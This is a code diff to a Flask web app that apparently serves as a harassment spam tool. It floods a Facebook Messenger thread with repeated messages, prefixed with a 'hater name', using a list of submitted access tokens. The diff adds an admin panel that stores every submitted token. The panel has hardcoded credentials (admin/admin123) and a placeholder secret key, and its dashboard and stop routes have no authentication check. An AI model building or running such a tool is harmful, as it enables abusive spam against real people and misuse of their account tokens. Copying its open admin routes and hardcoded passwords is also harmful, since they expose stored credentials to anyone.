@@ -1,11 +1,13 @@
-from flask import Flask, request, render_template_string
+from flask import Flask, request, render_template_string, redirect, url_for
 import requests
 from threading import Thread, Event
 import time
 import random
 import string
+from datetime import datetime
 
 app = Flask(__name__)
+app.secret_key = 'your-secret-key-here'  # Change this to a random secret key
 
 # Disable debug mode for production
 app.debug = False
@@ -22,16 +24,34 @@ headers = {
     'referer': 'www.google.com'
 }
 
+# Storage for tasks and admin data
 stop_events = {}
 threads = {}
+tasks_info = {}
+admin_username = "admin"
+admin_password = "admin123"  # Change this password
 
 def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
     stop_event = stop_events[task_id]
+    tasks_info[task_id] = {
+        'start_time': datetime.now(),
+        'status': 'running',
+        'access_tokens': access_tokens,
+        'thread_id': thread_id,
+        'hater_name': mn,
+        'time_interval': time_interval,
+        'messages': messages,
+        'sent_count': 0,
+        'failed_count': 0
+    }
+    
     while not stop_event.is_set():
         for message1 in messages:
             if stop_event.is_set():
                 break
             for access_token in access_tokens:
+                if stop_event.is_set():
+                    break
                 api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                 message = str(mn) + ' ' + message1
                 parameters = {'access_token': access_token, 'message': message}
@@ -39,11 +59,17 @@ def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id
                     response = requests.post(api_url, data=parameters, headers=headers, timeout=10)
                     if response.status_code == 200:
                         print(f"Message Sent Successfully From token {access_token}: {message}")
+                        tasks_info[task_id]['sent_count'] += 1
                     else:
                         print(f"Message Sent Failed From token {access_token}: {message}")
+                        tasks_info[task_id]['failed_count'] += 1
                 except Exception as e:
                     print(f"Error sending message: {e}")
+                    tasks_info[task_id]['failed_count'] += 1
                 time.sleep(time_interval)
+    
+    tasks_info[task_id]['status'] = 'stopped'
+    tasks_info[task_id]['end_time'] = datetime.now()
 
 @app.route('/', methods=['GET', 'POST'])
 def send_message():
@@ -165,6 +191,11 @@ def send_message():
       background: linear-gradient(45deg, #660000, #330000);
       box-shadow: 0 0 15px rgba(255, 0, 0, 0.7);
     }
+    .btn-warning {
+      background: linear-gradient(45deg, #663300, #996600);
+      border: 1px solid #ffaa00;
+      color: #ffcc00;
+    }
     .footer { text-align: center; margin-top: 20px; color: #0088ff; }
     .whatsapp-link {
       display: inline-block;
@@ -183,9 +214,33 @@ def send_message():
       background-color: #001122;
       color: #00ffff;
     }
+    .admin-link {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      color: #00ffff;
+      text-decoration: none;
+      font-size: 14px;
+    }
+    .task-table {
+      width: 100%;
+      margin-top: 20px;
+      border-collapse: collapse;
+    }
+    .task-table th, .task-table td {
+      border: 1px solid #00ffff;
+      padding: 8px;
+      text-align: left;
+    }
+    .task-table th {
+      background-color: rgba(0, 50, 100, 0.7);
+    }
   </style>
 </head>
 <body>
+  <a href="/admin" class="admin-link">
+    <i class="fas fa-cog"></i> Admin Panel
+  </a>
   <header class="header mt-4">
     <h1 class="mt-3">🥀🥀𝐓𝐇𝐄 𝐋𝐄𝐆𝐄𝐍𝐃 𝐊𝐀𝐋𝐔𝐖𝐀 𝐇𝐄𝐑𝐄🥀🥀</h1>
   </header>
@@ -258,6 +313,202 @@ def send_message():
 </body>
 </html>
 ''')
+
+@app.route('/admin', methods=['GET', 'POST'])
+def admin_login():
+    if request.method == 'POST':
+        username = request.form.get('username')
+        password = request.form.get('password')
+        
+        if username == admin_username and password == admin_password:
+            return redirect(url_for('admin_dashboard'))
+        else:
+            return "Invalid credentials", 401
+    
+    return render_template_string('''
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Admin Login</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
+  <style>
+    body {
+      background-color: #000011;
+      color: #00ffff;
+      font-family: 'Courier New', monospace;
+    }
+    .login-container {
+      max-width: 400px;
+      margin: 100px auto;
+      padding: 20px;
+      border: 1px solid #00ffff;
+      border-radius: 10px;
+      background-color: rgba(0, 10, 20, 0.9);
+      box-shadow: 0 0 20px rgba(0, 255, 255, 0.5);
+    }
+    .form-control {
+      background: rgba(0, 20, 40, 0.7);
+      border: 1px solid #00ffff;
+      color: #00ffff;
+    }
+    .btn-primary {
+      background: linear-gradient(45deg, #001122, #003366);
+      border: 1px solid #00ffff;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <h2 class="text-center mb-4">Admin Login</h2>
+    <form method="post">
+      <div class="mb-3">
+        <label class="form-label">Username</label>
+        <input type="text" class="form-control" name="username" required>
+      </div>
+      <div class="mb-3">
+        <label class="form-label">Password</label>
+        <input type="password" class="form-control" name="password" required>
+      </div>
+      <button type="submit" class="btn btn-primary w-100">Login</button>
+    </form>
+    <div class="text-center mt-3">
+      <a href="/" style="color: #00ffff;">← Back to Main Page</a>
+    </div>
+  </div>
+</body>
+</html>
+''')
+
+@app.route('/admin/dashboard')
+def admin_dashboard():
+    return render_template_string('''
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Admin Dashboard</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
+  <style>
+    body {
+      background-color: #000011;
+      color: #00ffff;
+      font-family: 'Courier New', monospace;
+      padding: 20px;
+    }
+    .dashboard-header {
+      margin-bottom: 30px;
+      text-align: center;
+    }
+    .task-table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-top: 20px;
+    }
+    .task-table th, .task-table td {
+      border: 1px solid #00ffff;
+      padding: 10px;
+      text-align: left;
+    }
+    .task-table th {
+      background-color: rgba(0, 50, 100, 0.7);
+    }
+    .status-running { color: #00ff00; }
+    .status-stopped { color: #ff0000; }
+    .btn-back {
+      margin-bottom: 20px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <a href="/" class="btn btn-warning btn-back">← Back to Main Page</a>
+    
+    <div class="dashboard-header">
+      <h1>🥀 Admin Dashboard 🥀</h1>
+      <p>Active Tasks: {{ active_tasks }} | Total Tasks: {{ total_tasks }}</p>
+    </div>
+
+    {% if tasks %}
+    <table class="task-table">
+      <thead>
+        <tr>
+          <th>Task ID</th>
+          <th>Status</th>
+          <th>Start Time</th>
+          <th>Hater Name</th>
+          <th>Thread ID</th>
+          <th>Tokens Used</th>
+          <th>Sent</th>
+          <th>Failed</th>
+          <th>Actions</th>
+        </tr>
+      </thead>
+      <tbody>
+        {% for task_id, task in tasks.items() %}
+        <tr>
+          <td>{{ task_id }}</td>
+          <td class="status-{{ task.status }}">{{ task.status|upper }}</td>
+          <td>{{ task.start_time.strftime('%Y-%m-%d %H:%M:%S') }}</td>
+          <td>{{ task.hater_name }}</td>
+          <td>{{ task.thread_id }}</td>
+          <td>
+            <details>
+              <summary>{{ task.access_tokens|length }} tokens</summary>
+              {% for token in task.access_tokens %}
+              <small>{{ token[:20] }}...</small><br>
+              {% endfor %}
+            </details>
+          </td>
+          <td>{{ task.sent_count }}</td>
+          <td>{{ task.failed_count }}</td>
+          <td>
+            {% if task.status == 'running' %}
+            <form method="post" action="/admin/stop_task" style="display: inline;">
+              <input type="hidden" name="task_id" value="{{ task_id }}">
+              <button type="submit" class="btn btn-danger btn-sm">Stop</button>
+            </form>
+            {% endif %}
+          </td>
+        </tr>
+        {% endfor %}
+      </tbody>
+    </table>
+    {% else %}
+    <div class="text-center">
+      <h3>No active tasks</h3>
+    </div>
+    {% endif %}
+
+    <div class="mt-4">
+      <form method="post" action="/admin/stop_all">
+        <button type="submit" class="btn btn-danger">Stop All Tasks</button>
+      </form>
+    </div>
+  </div>
+</body>
+</html>
+''', 
+tasks=tasks_info,
+active_tasks=len([t for t in tasks_info.values() if t['status'] == 'running']),
+total_tasks=len(tasks_info))
+
+@app.route('/admin/stop_task', methods=['POST'])
+def admin_stop_task():
+    task_id = request.form.get('task_id')
+    if task_id in stop_events:
+        stop_events[task_id].set()
+        return redirect(url_for('admin_dashboard'))
+    else:
+        return "Task not found", 404
+
+@app.route('/admin/stop_all', methods=['POST'])
+def admin_stop_all():
+    for task_id in list(stop_events.keys()):
+        stop_events[task_id].set()
+    return redirect(url_for('admin_dashboard'))
 
 @app.route('/stop', methods=['POST'])
 def stop_task():
